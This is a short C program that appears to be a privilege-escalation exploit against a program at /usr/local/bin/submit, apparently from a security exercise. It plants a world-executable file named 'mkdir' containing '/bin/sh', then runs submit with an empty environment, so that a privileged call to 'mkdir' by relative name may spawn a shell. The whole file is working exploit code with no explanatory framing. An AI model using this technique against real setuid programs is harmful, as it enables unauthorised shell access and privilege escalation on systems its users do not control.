#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

int main(void) {
  char *args[4], *env[1];

  FILE *file;
  file = fopen("mkdir", "w+"); // overwrite if already exists
  fprintf(file, "/bin/sh\n");
  fclose(file);
  chmod("mkdir", S_IRWXU | S_IRWXG | S_IRWXO); // 777: rwx for everyone

  args[0] = "/usr/local/bin/submit";
  args[1] = "file";
  args[2] = "message";
  args[3] = NULL;

  env[0] = NULL;

  return execve("/usr/local/bin/submit", args, env);
}
